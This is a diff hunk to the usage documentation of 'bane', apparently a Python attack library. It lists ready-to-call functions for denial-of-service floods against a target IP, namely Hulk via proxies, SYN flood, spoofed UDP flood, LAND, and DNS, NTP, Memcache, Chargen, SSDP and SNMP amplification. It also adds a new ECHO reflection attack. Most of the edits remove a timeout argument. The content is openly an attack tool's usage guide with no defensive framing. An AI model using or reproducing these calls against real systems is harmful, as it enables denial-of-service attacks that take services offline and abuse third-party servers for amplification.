@@ -146,20 +146,22 @@ II-Usage:
 <h4>Hulk attack through proxies:</h4>
 <br>bane.prox_hulk(IP , duration= 300 , set_tor=False , threads=50 , timeout=5 )
 <h4>TCP flags attack:</h4>
-<br>bane.synflood(IP , p=port , duration= 300 , syn=1 , rst=0 , psh=0 , ack=0 , urg=0 , fin=0 , interval=0.1 , threads=50 , timeout=5 )
+<br>bane.synflood(IP , p=port , duration= 300 , syn=1 , rst=0 , psh=0 , ack=0 , urg=0 , fin=0 , interval=0.1 , threads=50 )
 <h4>Spoofed source UDP flood:</h4>
-<br>bane.spoofed_udp_flood(IP , p=port , duration= 300 , min_size=10 , max_size=20 , interval=0.1 , threads=50 , timeout=5 )
+<br>bane.spoofed_udp_flood(IP , p=port , duration= 300 , min_size=10 , max_size=20 , interval=0.1 , threads=50 )
 <h4>LAND attack:</h4>
-<br>bane.land(IP , p=port , duration= 300 , min_size=10 , max_size=20 , interval=0.1 , threads=50 , timeout=5 )
+<br>bane.land(IP , p=port , duration= 300 , min_size=10 , max_size=20 , interval=0.1 , threads=50 )
 <h4>DNS amplification attack:</h4>
-<br>bane.dns_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
+<br>bane.dns_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 )
 <h4>NTP amplification attack:</h4>
-<br>bane.ntp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
+<br>bane.ntp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 )
 <h4>Memcache amplification attack:</h4>
-<br>bane.memcache_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
+<br>bane.memcache_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 )
 <h4>Chargen amplification attack:</h4>
-<br>bane.chargen_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
+<br>bane.chargen_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 )
 <h4>SSDP amplification attack:</h4>
-<br>bane.ssdp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
+<br>bane.ssdp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 )
 <h4>SNMP amplification attack:</h4>
-<br>bane.snmp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
+<br>bane.snmp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 )
+<h4>ECHO reflection attack:</h4>
+<br>bane.echo_reflection(IP , p=port , min_size=10 , max_size=20 , duration= 300 , servers=[] , interval=0.1 , threads=50 )
